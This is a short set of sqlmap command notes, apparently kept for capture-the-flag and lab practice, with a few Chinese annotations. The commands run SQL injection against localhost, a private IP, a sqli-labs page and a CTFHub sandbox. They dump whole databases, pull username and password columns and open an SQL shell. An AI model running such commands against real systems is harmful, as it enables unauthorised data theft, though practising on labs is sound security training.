
```


sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --dbs

sqlmap -u "http://localhost/test.php?id=98" --count

sqlmap -u "http://localhost/test.php?id=98" --dump-all --flush-session

sqlmap -u "http://localhost/test.php?id=98" --sql-query="SELECT username, password FROM test"

sqlmap -u "http://localhost/test.php?id=98" -v 1 --sql-shell



```


```

python sqlmap/sqlmap.py -u http://www.any.com/sqli/Less-20/index.php --cookie "uname=admin" --level 2

sqlmap -u "http://challenge-d288e37f585c89c6.sandbox.ctfhub.com:10800/" -proxy=http://127.0.0.1:8080 --dbms=mysql --level=3 --risk=2  --flush-session --batch --cookie="id=1"


sqlmap -u "http://challenge-d288e37f585c89c6.sandbox.ctfhub.com:10800/" -proxy=http://127.0.0.1:8080 --dbms=mysql --dump-all

```



```

sqlmap -r 请求头.txt --batch

注入项改成*

sqlmap -r header.txt --batch --dbms=mysql  --level=3 --risk=2 -proxy=http://127.0.0.1:8080

```